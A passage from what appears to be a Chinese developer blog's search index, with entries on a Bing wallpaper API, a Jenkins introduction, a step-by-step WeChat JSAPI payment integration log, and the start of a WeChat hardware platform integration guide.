<li>访问 <a href="https://api.ioliu.cn/bing/" target="_blank" rel="noopener">https://api.ioliu.cn/bing/</a> , 返回bing每日最新背景图, 可选参数<code>[w,h]</code></li>
</ol>
</li>
<li><ol>
<li>访问 <a href="https://api.ioliu.cn/bing/?d=n" target="_blank" rel="noopener">https://api.ioliu.cn/bing/?d=n</a> (n&gt;=0), 返回以当日为起点第n天前的壁纸, 可选参数<code>[w,h]</code></li>
</ol>
</li>
<li><ol>
<li>访问 <a href="https://api.ioliu.cn/bing/json/" target="_blank" rel="noopener">https://api.ioliu.cn/bing/json/</a> , 返回bing每日最新壁纸的相关(介绍、图片地址等)信息(json格式), 可选参数<code>[callback]</code>.  </li>
</ol>
</li>
<li><ol>
<li>访问 <a href="https://api.ioliu.cn/bing/rand/" target="_blank" rel="noopener">https://api.ioliu.cn/bing/rand/</a> , 返回随机图片, 可选参数<code>[w,h]</code></li>
</ol>
</li>
<li><ol>
<li>访问 <a href="https://api.ioliu.cn/bing/blur/" target="_blank" rel="noopener">https://api.ioliu.cn/bing/blur/</a> , 返回<code>高斯模糊</code>图片, 可选参数<code>[d,w,h]</code></li>
</ol>
</li>
</ul>
<p>带<code>[w,h]</code>用法： <a href="https://api.ioliu.cn/bing/rand/?w=1920&amp;h=1200" target="_blank" rel="noopener">https://api.ioliu.cn/bing/rand/?w=1920&amp;h=1200</a>  </p>
<p><code>https://api.ioliu.cn/bing/json/</code> 返回的json格式如下(支持<code>跨域调用</code>和<code>jsonp</code>)：  </p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    id: "47",</span><br><span class="line">    title: "有灵气的犄角",</span><br><span class="line">    attribute: "大角羊",</span><br><span class="line">    description: "头顶两只巨大羊角的大角羊喜欢生活在多岩石的干燥地区，它们尤为喜欢各种开阔、干燥的沙漠和岩石山上。在落基山脉，大角羊随处可见，行动敏捷、视力敏锐的它们为这片旷野增添了不少活力。",</span><br><span class="line">    startdate: "20160419",</span><br><span class="line">    enddate: "20160420",</span><br><span class="line">    fullstartdate: "201604191600",</span><br><span class="line">    url: "http://s.cn.bing.net/az/hprichbg/rb/BigHornSheep_ZH-CN6358178150_1920x1080.jpg",</span><br><span class="line">    urlbase: "/az/hprichbg/rb/BigHornSheep_ZH-CN6358178150",</span><br><span class="line">    copyright: "加拿大，阿尔伯塔，卡纳纳斯基斯行政区的落基山脉大角羊 (© Walter Nussbaumer/Corbis)",</span><br><span class="line">    copyrightlink: "http://www.bing.com/search?q=%E5%A4%A7%E8%A7%92%E7%BE%8A&amp;form=hpcapt&amp;mkt=zh-cn",</span><br><span class="line">    hsh: "7da649ef5e67013814d6b618d0a35ece",</span><br><span class="line">    qiniu_url: "BigHornSheep_ZH-CN6358178150",</span><br><span class="line">    date: "2016-04-20"</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>Bing支持分辨率<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1920x1200   </span><br><span class="line">1920x1080    </span><br><span class="line">1366x768   </span><br><span class="line">1280x768    </span><br><span class="line">1024x768    </span><br><span class="line">800x600    </span><br><span class="line">800x480</span><br><span class="line">768x1280  </span><br><span class="line">720x1280      </span><br><span class="line">640x480   </span><br><span class="line">480x800     </span><br><span class="line">400x240     </span><br><span class="line">320x240 </span><br><span class="line">240x320</span><br></pre></td></tr></table></figure></p>
]]></content>
  </entry>
  <entry>
    <title>虾米歌曲搜索接口</title>
    <url>/%E5%BC%80%E6%94%BEAPI/%E8%99%BE%E7%B1%B3%E6%AD%8C%E6%9B%B2%E6%90%9C%E7%B4%A2%E6%8E%A5%E5%8F%A3/</url>
    <content><![CDATA[<p><a href="http://open.taobao.com/docs/api.htm?spm=a219a.7629065.0.0.ycrjyp&amp;apiId=27710#" target="_blank" rel="noopener">alibaba.music.search.songs.get (虾米歌曲搜索5.0接口)</a></p>
]]></content>
      <categories>
        <category>开放API</category>
      </categories>
  </entry>
  <entry>
    <title>Jenkins 介绍</title>
    <url>/%E6%8C%81%E7%BB%AD%E9%9B%86%E6%88%90CI/Jenkins%20%E4%BD%BF%E7%94%A8%E4%BB%8B%E7%BB%8D/</url>
    <content><![CDATA[<p><a href="https://jenkins.io" target="_blank" rel="noopener">Jenkins</a>是一个开源软件项目，是基于Java开发的一种持续集成工具。Jenkins非常灵活，不过需要自己部署服务器，功能非常强大。可以通过配置插件，实现各种项目的 <code>编译</code> - <code>打包</code> - <code>部署</code> 等一条龙服务工作。</p>
<p>……篇幅较长，还是看别人的吧 <a href="https://www.cnblogs.com/rslai/p/8135460.html" target="_blank" rel="noopener">《搭建jenkins实现自动化部署》</a></p>
]]></content>
      <categories>
        <category>持续集成CI</category>
      </categories>
  </entry>
  <entry>
    <title>微信支付开发日志</title>
    <url>/%E5%BE%AE%E4%BF%A1%E5%85%AC%E4%BC%97%E5%B9%B3%E5%8F%B0%E6%8E%A5%E5%8F%A3/%E5%BE%AE%E4%BF%A1%E6%94%AF%E4%BB%98%E5%BC%80%E5%8F%91%E6%97%A5%E5%BF%97/</url>
    <content><![CDATA[<p>支付类型很多，这里是指在公众号上调用 <code>JSAPI支付</code></p>
<p><img src="/images/weixin/支付产品.png" alt="支付产品.png"></p>
<h2 id="开通支付"><a href="#开通支付" class="headerlink" title="开通支付"></a>开通支付</h2><p>这部分比较繁琐，但都是一些资料认证，在公众号平台的入口进入申请提交就可以了。</p>
<h2 id="商户平台"><a href="#商户平台" class="headerlink" title="商户平台"></a>商户平台</h2><p>如果成功开通了 <code>微信支付</code> ，那么你就可以登录 <a href="https://pay.weixin.qq.com/index.php" target="_blank" rel="noopener">商户平台</a> 了，进行关联公众号，成功关联之后，就能实现在当前公众号中使用微信支付收款。</p>
<p>在 <code>产品中心 &gt; APPID授权管理 &gt; 账号关联（AppID绑定） &gt; 已关联账号</code> ，可以看到 是否已经关联公众号(服务号) 。</p>
<h2 id="准备开发所需参数"><a href="#准备开发所需参数" class="headerlink" title="准备开发所需参数"></a>准备开发所需参数</h2><ol>
<li><code>商户平台 &gt; 产品中心 &gt; 开发配置</code> 处，可以找到<code>商户号</code> 。</li>
<li><code>商户平台 &gt; 账户中心 &gt; API安全 &gt; API密钥</code> 安装安全证书之后，就可以设置API密钥，密钥为32为字符，自己定义。</li>
<li><code>商户平台 &gt; 账户中心 &gt; API安全 &gt; API证书</code>，申请证书，下载的是一个zip压缩包，有p12和pem证书。</li>
<li><code>公众平台 &gt; 开发 &gt; 基本配置 &gt; AppId</code></li>
<li><code>公众平台 &gt; 开发 &gt; 基本配置 &gt; AppSecret</code></li>
</ol>
<h2 id="公众号设置"><a href="#公众号设置" class="headerlink" title="公众号设置"></a>公众号设置</h2><p><code>公众号设置 &gt; 功能设置</code> ，在 <code>业务域名，JS接口安全域名，网页授权域名</code> 三个地方设置前端的域名，如 <code>wx.mydomain.com</code></p>
<h2 id="公众平台-后端开发"><a href="#公众平台-后端开发" class="headerlink" title="公众平台-后端开发"></a>公众平台-后端开发</h2><p>第一步先把公众平台的接口调通，这相对简单一些，在保证公众平台没问题的情况下，再进行微信支付的接口开发。</p>
<h5 id="1-签名接口"><a href="#1-签名接口" class="headerlink" title="1. 签名接口"></a>1. 签名接口</h5><p>首先，后端要提供一个签名接口，用于前端签名当前的URL，否则无法调用 <code>JSSDK</code> 的接口。</p>
<p>签名算法可以看 <a href="https://mp.weixin.qq.com/wiki?t=resource/res_main&amp;id=mp1421141115" target="_blank" rel="noopener">微信文档</a> ，大概流程：前端将URL发到后端，后端签名成功返回 <code>timestamp、nonceStr、signature</code> 三个参数的结果。</p>
<h5 id="2-获取用户的OpenId"><a href="#2-获取用户的OpenId" class="headerlink" title="2. 获取用户的OpenId"></a>2. 获取用户的OpenId</h5><p><code>OpenId</code> 是用户的标识，在支付的时候要用到。本身这个接口非常简单，前端也可以直接向微信服务器请求，但为了不暴露公众号的 <code>AppSecret</code> 参数和跨域问题，这个请求放在后端发起。 </p>
<p><a href="https://mp.weixin.qq.com/wiki?t=resource/res_main&amp;id=mp1421140842" target="_blank" rel="noopener">微信文档：第二步</a> </p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">https://api.weixin.qq.com/sns/oauth2/access_token?appid=APPID&amp;secret=SECRET&amp;code=CODE&amp;grant_type=authorization_code</span><br></pre></td></tr></table></figure>
<p>前端传入code，后端发起GET请求，响应结果直接返给前端。</p>
<h2 id="公众平台-前端开发"><a href="#公众平台-前端开发" class="headerlink" title="公众平台-前端开发"></a>公众平台-前端开发</h2><p>前端开发在 《微信web开发者工具》（以下称：模拟器）下进行，下载地址：<a href="https://mp.weixin.qq.com/debug/cgi-bin/webdebugger/download?from=mpwiki&amp;os=x64" target="_blank" rel="noopener">下载</a> 。需要在 <code>公众号平台 &gt; 开发者工具 &gt;web开发者工具</code> 绑定开发者的微信号。</p>
<blockquote>
<p>坑：npm上没有微信官方发布的包， <code>weixin-jsapi</code> 是个人发布v1.1.0 版本的包。</p>
<p>网上很多文章用 <code>weixin-js-sdk</code> 这个包也是个人发布的，目前最新的1.4.0版，但是只能通过require使用，Vue中并不能用，有问题。</p>
</blockquote>
<h5 id="1-微信网页授权"><a href="#1-微信网页授权" class="headerlink" title="1. 微信网页授权"></a>1. 微信网页授权</h5><p><a href="https://mp.weixin.qq.com/wiki?t=resource/res_main&amp;id=mp1421140842" target="_blank" rel="noopener">微信文档：第一步</a> 拿到 <code>code</code> 直接向后端发起请求获取 <code>OpenId</code> ，正确的话，有以下数据包返回，我们就用到<code>openid</code> ，缓存起来备用 。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    &quot;access_token&quot;:&quot;ACCESS_TOKEN&quot;,</span><br><span class="line">    &quot;expires_in&quot;:7200,</span><br><span class="line">    &quot;refresh_token&quot;:&quot;REFRESH_TOKEN&quot;,</span><br><span class="line">    &quot;openid&quot;:&quot;OPENID&quot;,</span><br><span class="line">    &quot;scope&quot;:&quot;SCOPE&quot; </span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure>
<h5 id="2-通过config接口注入权限验证配置"><a href="#2-通过config接口注入权限验证配置" class="headerlink" title="2. 通过config接口注入权限验证配置"></a>2. 通过config接口注入权限验证配置</h5><p>所有需要使用JS-SDK的页面必须先注入配置信息，否则将无法调用。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">wx.config(&#123;</span><br><span class="line">    debug: <span class="literal">true</span>, <span class="comment">// 开启调试模式,调用的所有api的返回值会在客户端alert出来</span></span><br><span class="line">    appId: <span class="string">''</span>, <span class="comment">// 必填，公众号的唯一标识</span></span><br><span class="line">    timestamp: , <span class="comment">// 必填，生成签名的时间戳</span></span><br><span class="line">    nonceStr: <span class="string">''</span>, <span class="comment">// 必填，生成签名的随机串</span></span><br><span class="line">    signature: <span class="string">''</span>,<span class="comment">// 必填，签名</span></span><br><span class="line">    jsApiList: [] <span class="comment">// 必填，需要使用的JS接口列表</span></span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>
<p>上面这些参数，需要向后端的 <code>签名接口</code> 发起请求获取，<code>appId</code> 可以写在前端代码中，也可以由后端响应返回。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">jsApiList: [<span class="string">'getNetworkType'</span>,<span class="string">'chooseWXPay'</span>]</span><br></pre></td></tr></table></figure>
<p>这里是两个需要使用的JS接口，<code>getNetworkType</code> 用于测试，<code>chooseWXPay</code> 就是微信支付的接口。</p>
<p>执行 <code>wx.config</code> ，如果模拟器弹出 <code>ok</code> 的话，表示签名没问题了。</p>
<blockquote>
<p>由于微信支付在模拟器无法调试，所以有必要选用一个其他接口（如 getNetworkType）来调试。</p>
</blockquote>
<h5 id="3-检查能否调用JSSDK"><a href="#3-检查能否调用JSSDK" class="headerlink" title="3. 检查能否调用JSSDK"></a>3. 检查能否调用JSSDK</h5><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">wx.getNetworkType(&#123;</span><br><span class="line">success: <span class="function"><span class="keyword">function</span> (<span class="params">res</span>) </span>&#123;</span><br><span class="line"><span class="keyword">var</span> networkType = res.networkType; <span class="comment">// 返回网络类型2g，3g，4g，wifi</span></span><br><span class="line">&#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>
<p>如果模拟器弹出当前的网络类型，就表示成功了。</p>
<h2 id="沙箱sandbox测试开发"><a href="#沙箱sandbox测试开发" class="headerlink" title="沙箱sandbox测试开发"></a>沙箱sandbox测试开发</h2><p>微信支付沙箱开发时， 官方开发文档只是简单说明， 并没有给出相关示例。</p>
<p>沙箱开发要修改两个地方：</p>
<ol>
<li>路径</li>
<li>秘钥Key</li>
</ol>
<p>其中，Key要通过Post请求获取，但文档请求参数怎么传说的不清楚（其实是xml格式）， <a href="https://pay.weixin.qq.com/wiki/doc/api/jsapi.php?chapter=23_1" target="_blank" rel="noopener">文档地址</a> 。</p>
<p>沙箱测试要关注公众号 <code>WXPayAssist</code> ，里面很多相关的资料，<code>沙箱测试付款</code>也是要在这个公众号下进行。</p>
<p>获取Key的请求如下：</p>
<p>其中，sign 和支付的签名算法一样，要用到正式的KEY来签名。</p>
<blockquote>
<p><a href="https://api.mch.weixin.qq.com/sandboxnew/pay/getsignkey" target="_blank" rel="noopener">https://api.mch.weixin.qq.com/sandboxnew/pay/getsignkey</a></p>
</blockquote>
<p><img src="/images/weixin/微信接口-沙箱KEY.png" alt="微信接口-沙箱KEY"></p>
<h2 id="微信支付-后端开发"><a href="#微信支付-后端开发" class="headerlink" title="微信支付-后端开发"></a>微信支付-后端开发</h2><p>微信支付的后端开发，即要调用 <a href="https://pay.weixin.qq.com/wiki/doc/api/jsapi.php?chapter=9_1" target="_blank" rel="noopener">微信文档：统一下单</a> 接口，获取 <code>预支付交易会话标识 prepay_id</code> ，生成 <code>支付签名</code> 响应给前端。<a href="https://mp.weixin.qq.com/wiki?t=resource/res_main&amp;id=mp1421141115" target="_blank" rel="noopener">支付签名</a> 由：<code>appId, timeStamp, nonceStr, package, signType</code> 参与签名，其中</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">String packages = <span class="string">"prepay_id="</span> + prepay_id;</span><br></pre></td></tr></table></figure>
<p>这里的签名算法直接调用微信的 JavaSDK 里面的方法，所以不管它了，要注意的是签名的类型最好统一一种，比如全部用<code>MD5</code>或者<code>HMAC-SHA256</code>。</p>
<h5 id="1-统一下单"><a href="#1-统一下单" class="headerlink" title="1. 统一下单"></a>1. 统一下单</h5><p>调用微信的统一下单接口，所需要的参数如下：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">data.put(<span class="string">"body"</span>, <span class="string">"腾讯充值中心-QQ会员充值"</span>);<span class="comment">//商家名称-销售商品类目</span></span><br><span class="line">data.put(<span class="string">"out_trade_no"</span>, <span class="string">"2016090910595900000012"</span>);<span class="comment">//商户订单号,商户系统内部订单号，要求32个字符内，只能是数字、大小写字母_-|* 且在同一个商户号下唯一</span></span><br><span class="line">data.put(<span class="string">"openid"</span>, <span class="string">"xxx"</span>);<span class="comment">//用户标识,此参数为微信用户在商户对应appid下的唯一标识</span></span><br><span class="line">data.put(<span class="string">"total_fee"</span>, <span class="string">"1"</span>);<span class="comment">//标价金额,订单总金额，单位为分</span></span><br><span class="line">data.put(<span class="string">"spbill_create_ip"</span>, <span class="string">'192.168.0.0'</span>);<span class="comment">//用户IP,</span></span><br><span class="line">data.put(<span class="string">"notify_url"</span>, <span class="string">"http://www.example.com/wxpay/notify"</span>);<span class="comment">//通知地址,异步接收微信支付结果通知的回调地址，通知url必须为外网可访问的url，不能携带参数。</span></span><br><span class="line">data.put(<span class="string">"fee_type"</span>, <span class="string">"CNY"</span>);</span><br><span class="line">data.put(<span class="string">"trade_type"</span>, <span class="string">"JSAPI"</span>);  <span class="comment">// 此处指定为JSAPI支付（或小程序支付）</span></span><br></pre></td></tr></table></figure>
<p>微信响应结果是XML数据，转为JSON结果如下：</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line">&#123;<span class="attr">"nonce_str"</span>:<span class="string">"xxx"</span>,<span class="attr">"appid"</span>:<span class="string">"xxx"</span>,<span class="attr">"sign"</span>:<span class="string">"xxx"</span>,<span class="attr">"trade_type"</span>:<span class="string">"JSAPI"</span>,<span class="attr">"return_msg"</span>:<span class="string">"OK"</span>,<span class="attr">"result_code"</span>:<span class="string">"SUCCESS"</span>,<span class="attr">"mch_id"</span>:<span class="string">"xxx"</span>,<span class="attr">"return_code"</span>:<span class="string">"SUCCESS"</span>,<span class="attr">"prepay_id"</span>:<span class="string">"xxx"</span>&#125;</span><br></pre></td></tr></table></figure>
<p>解析数据包，提取 <code>prepay_id</code> </p>
<p>打包<code>参与支付签名</code> 的数据 (注意 <code>timeStamp</code> 自动一定要大写 <code>S</code> )</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">String packages = <span class="string">"prepay_id="</span> + prepay_id;</span><br><span class="line">Map&lt;String, String&gt; wxPayMap = <span class="keyword">new</span> HashMap&lt;&gt;();</span><br><span class="line">wxPayMap.put(<span class="string">"appId"</span>, <span class="string">"xxx"</span>);</span><br><span class="line">wxPayMap.put(<span class="string">"timeStamp"</span>, String.valueOf(System.currentTimeMillis()/<span class="number">1000</span>));</span><br><span class="line">wxPayMap.put(<span class="string">"nonceStr"</span>, UUID.randomUUID().toString().substring(<span class="number">16</span>).replace(<span class="string">"-"</span>,<span class="string">""</span>));</span><br><span class="line">wxPayMap.put(<span class="string">"package"</span>, packages);</span><br><span class="line">wxPayMap.put(<span class="string">"signType"</span>, <span class="string">"HMAC-SHA256"</span>);</span><br></pre></td></tr></table></figure>
<p>将 <code>支付签名</code> 结果 <code>sign</code> 和 <code>参与签名</code> 的数据 打包响应给前端</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Map&lt;String,String&gt; result = <span class="keyword">new</span> HashMap&lt;&gt;();</span><br><span class="line">result.put(<span class="string">"paySign"</span>, sign);</span><br><span class="line">result.putAll(wxPayMap);</span><br></pre></td></tr></table></figure>
<p>例如：</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line">&#123;<span class="attr">"timeStamp"</span>:<span class="string">"1555476146"</span>,<span class="attr">"packageStr"</span>:<span class="string">"prepay_id=xxx"</span>,<span class="attr">"paySign"</span>:<span class="string">"xx"</span>,<span class="attr">"appId"</span>:<span class="string">"xxx"</span>,<span class="attr">"signType"</span>:<span class="string">"HMAC-SHA256"</span>,<span class="attr">"nonceStr"</span>:<span class="string">"xxx"</span>&#125;</span><br></pre></td></tr></table></figure>
<h5 id="2-接收通知"><a href="#2-接收通知" class="headerlink" title="2. 接收通知"></a>2. 接收通知</h5><p><code>notify_url</code> 填的是后端的接口地址，新建一个接口用于异步接收微信支付结果。</p>
<p>微信服务器将以 <code>流</code> 的方式给这个地址发送xml格式的数据：</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">xml</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">appid</span>&gt;</span>&lt;![CDATA[xxx]]&gt;<span class="tag">&lt;/<span class="name">appid</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">bank_type</span>&gt;</span>&lt;![CDATA[CFT]]&gt;<span class="tag">&lt;/<span class="name">bank_type</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">cash_fee</span>&gt;</span>&lt;![CDATA[1]]&gt;<span class="tag">&lt;/<span class="name">cash_fee</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">fee_type</span>&gt;</span>&lt;![CDATA[CNY]]&gt;<span class="tag">&lt;/<span class="name">fee_type</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">is_subscribe</span>&gt;</span>&lt;![CDATA[Y]]&gt;<span class="tag">&lt;/<span class="name">is_subscribe</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">mch_id</span>&gt;</span>&lt;![CDATA[xxx]]&gt;<span class="tag">&lt;/<span class="name">mch_id</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">nonce_str</span>&gt;</span>&lt;![CDATA[xxx]]&gt;<span class="tag">&lt;/<span class="name">nonce_str</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">openid</span>&gt;</span>&lt;![CDATA[xxx]]&gt;<span class="tag">&lt;/<span class="name">openid</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">out_trade_no</span>&gt;</span>&lt;![CDATA[xxx]]&gt;<span class="tag">&lt;/<span class="name">out_trade_no</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">result_code</span>&gt;</span>&lt;![CDATA[SUCCESS]]&gt;<span class="tag">&lt;/<span class="name">result_code</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">return_code</span>&gt;</span>&lt;![CDATA[SUCCESS]]&gt;<span class="tag">&lt;/<span class="name">return_code</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">sign</span>&gt;</span>&lt;![CDATA[xxx]]&gt;<span class="tag">&lt;/<span class="name">sign</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">time_end</span>&gt;</span>&lt;![CDATA[xxx]]&gt;<span class="tag">&lt;/<span class="name">time_end</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">total_fee</span>&gt;</span>1<span class="tag">&lt;/<span class="name">total_fee</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">trade_type</span>&gt;</span>&lt;![CDATA[JSAPI]]&gt;<span class="tag">&lt;/<span class="name">trade_type</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">transaction_id</span>&gt;</span>&lt;![CDATA[xxx]]&gt;<span class="tag">&lt;/<span class="name">transaction_id</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">xml</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>接收到消息之后，要回复响应数据：</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">xml</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">return_code</span>&gt;</span>&lt;![CDATA[SUCCESS]]&gt;<span class="tag">&lt;/<span class="name">return_code</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">return_msg</span>&gt;</span>&lt;![CDATA[OK]]&gt;<span class="tag">&lt;/<span class="name">return_msg</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">xml</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>接收数据示例代码：</p>
<p>要从HttpServletRequest 的 getInputStream 方法获取流，从流读取byte ，不过我们用SpringMVC可以很简洁的接收：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> String <span class="title">notifyPay</span><span class="params">(@RequestBody <span class="keyword">byte</span>[] body)</span></span>&#123;</span><br><span class="line">    String result = <span class="keyword">null</span>;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            result = <span class="keyword">new</span> String(body, <span class="string">"UTF-8"</span>);</span><br><span class="line">            logger.info(<span class="string">"result:\n"</span>+result);</span><br><span class="line"></span><br><span class="line">        &#125; <span class="keyword">catch</span> (UnsupportedEncodingException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="微信支付-前端"><a href="#微信支付-前端" class="headerlink" title="微信支付-前端"></a>微信支付-前端</h2><p>剩下最后一步了：唤起微信支付，这个操作要在手机微信上进行，真实的环境。</p>
<p>将付款的页面URL放在 <code>商户平台 &gt; 产品中心 &gt;支付配置 &gt; JSAPI支付授权目录</code> 中，</p>
<blockquote>
<ol>
<li><p>仅有公众号支付和扫码支付需配置支付域名，APP支付、刷卡支付无需配置域名</p>
</li>
<li><p>所有使用JS API方式发起支付请求的链接地址，都必须在当前页面所配置的支付授权目录之下。下单前需要调用【网页授权获取用户信息】接口获取到用户的Openid</p>
</li>
<li><p>当公众平台接到扫码支付请求时，会回调当前页面所配置的支付回调链接传递订单信息</p>
</li>
</ol>
</blockquote>
<p>授权目录须以左斜杠 “/” 结尾 ，例如：</p>
<p>支付的地址是：<code>http://wx.mydomain.com/#/car/pay</code> ;</p>
<p>授权目录设置为：<code>http://wx.mydomain.com/#/car/</code> 。</p>
<p><img src="/images/weixin/支付授权目录配置.png" alt="支付授权目录配置.png"></p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">wx.chooseWXPay(&#123;</span><br><span class="line">timestamp: <span class="string">''</span>, <span class="comment">// 支付签名时间戳，注意微信jssdk中的所有使用timestamp字段均为小写。但最新版的支付后台生成签名使用的timeStamp字段名需大写其中的S字符</span></span><br><span class="line">nonceStr: <span class="string">''</span>, <span class="comment">// 支付签名随机串，不长于 32 位</span></span><br><span class="line">package: <span class="string">''</span>, <span class="comment">// 统一支付接口返回的prepay_id参数值，提交格式如：prepay_id=\*\*\*）</span></span><br><span class="line">signType: <span class="string">''</span>, <span class="comment">// 签名方式，默认为'SHA1'，使用新版支付需传入'MD5'</span></span><br><span class="line">paySign: <span class="string">''</span>, <span class="comment">// 支付签名</span></span><br><span class="line">success: <span class="function"><span class="keyword">function</span> (<span class="params">res</span>) </span>&#123;</span><br><span class="line"><span class="comment">// 支付成功后的回调函数</span></span><br><span class="line">&#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>
<p><code>chooseWXPay</code> 的参数都在后端的<code>统一下单</code> 接口响应里面，解析JSON数据即可。要注意的是，这里有一个坑 <code>timestamp</code> ，后端生成 <code>支付签名</code> 的是 <code>timeStamp</code>，<code>S</code>是大写的，但前端 <code>chooseWXPay</code> 的 <code>timestamp</code>依然是全部小写的。</p>
<p>如果没问题，即可以看到手机的 <code>微信支付输入密码</code> 弹框了。</p>
]]></content>
      <categories>
        <category>微信公众平台</category>
      </categories>
      <tags>
        <tag>微信公众平台</tag>
      </tags>
  </entry>
  <entry>
    <title>微信硬件平台接入</title>
    <url>/%E5%BE%AE%E4%BF%A1%E5%85%AC%E4%BC%97%E5%B9%B3%E5%8F%B0%E6%8E%A5%E5%8F%A3/%E5%BE%AE%E4%BF%A1%E7%A1%AC%E4%BB%B6%E5%B9%B3%E5%8F%B0%E6%8E%A5%E5%85%A5/</url>
    <content><![CDATA[<h2 id="微信硬件平台方案"><a href="#微信硬件平台方案" class="headerlink" title="微信硬件平台方案"></a>微信硬件平台方案</h2><p>假如我们要有一个WiFi硬件产品，已经有与自己的服务器通讯的私有协议，现在要接入到微信公众号平台，那将如何选择对接方案呢？</p>
<p><a href="https://iot.weixin.qq.com" target="_blank" rel="noopener">《微信硬件平台》</a> 有两大类接入方案：<code>微信硬件云标准接入方案</code> 和 <code>平台基础接入方案</code>。</p>
<p><img src="/images/weixin/选择接入方案.png" alt="选择接入方案.png"></p>
<h2 id="调试工具"><a href="#调试工具" class="headerlink" title="调试工具"></a>调试工具</h2><p> <a href="https://mp.weixin.qq.com/debug/" target="_blank" rel="noopener">微信公众平台接口调试工具</a></p>
<p><img src="/images/weixin/硬件接口api接口调试.png" alt="硬件接口api接口调试.png"></p>
<p><img src="/images/weixin/设备绑定通知.png" alt="设备绑定通知.png"></p>
<blockquote>
<p>注意：此处已认为你已对接完成微信公众平台，比如已经能接收微信平台的文本消息等，并且已经开启“设备功能”。</p>
</blockquote>
<h2 id="名称约定"><a href="#名称约定" class="headerlink" title="名称约定"></a>名称约定</h2><p>设备：这里指WiFi设备，跟微信没有近场通讯的功能。</p>
<p>硬件云：我们的服务器</p>
<p>微信云：微信公众号平台的服务器，推送的是xml格式消息</p>
<p>微信IoT云（微信硬件云）：微信硬件平台的服务器，推送json格式消息</p>
<p>以下 “我们的服务器” 统一称为 “服务器” </p>
<h2 id="一、平台基础接入方案"><a href="#一、平台基础接入方案" class="headerlink" title="一、平台基础接入方案"></a>一、平台基础接入方案</h2><blockquote>
<p>摘录微信：设备不对接微信硬件云，设备消息将以xml格式发送到开发者在 <code>公众平台/基本配置</code> 填写的服务器地址。可以使用连接、消息接收等基础能力，但将不具备微信硬件平台制定的产品标准能力。</p>
</blockquote>
<p><img src="/images/weixin/平台基础接方案.png" alt="平台基础接方案.png"></p>
<p>这种方案相对简单，<code>微信云</code> 将消息以普通的消息（如文本消息，xml格式）一样推送到服务器。</p>
<p><em>注意：不需要在 <code>设备功能-设置</code> 配置服务器URL。</em></p>
<p>我们使用 <a href="https://mp.weixin.qq.com/debug/" target="_blank" rel="noopener">调试工具</a> 的来模拟 <code>微信云</code> 推送过来的消息，选择 <code>接口类型：使用硬件接入消息接口调试</code> ，里面有4个接口：</p>
<ol>
<li><p>设备向后台发送数据</p>
<p>这个接口是指：设备通过微信和服务器通信，并且接收服务器的响应。指的应该是 <code>近场通讯</code> ，忽略。</p>
</li>
<li><p>请求绑定消息</p>
<p>这应该是过期的接口，在文档上没找到，忽略。</p>
</li>
<li><p>绑定、解绑消息</p>
<p>这个接口非常重要，用户扫码绑定设备或者解除绑定，<code>微信云</code> 都会推送到服务器，服务器可以进行关系的绑定和解除。</p>
</li>
<li><p>WiFi设备连接状态订阅、退订消息</p>
<p>这个是状态（如在线、离线），用户在微信上需要知道设备的状态，所以 <code>微信云</code> 需要向服务器订阅状态，<code>微信云</code>推送订阅消息时，服务器需响应设备的状态数据，当设备的状态改变时，需主动将状态数据发送给 <code>微信云</code> 。</p>
</li>
</ol>
<p>其中，<code>设备向后台发送数据</code> 的消息类型是<code>device_text</code> ，其他三个是 <code>device_event</code> 。如绑定事件消息：</p>
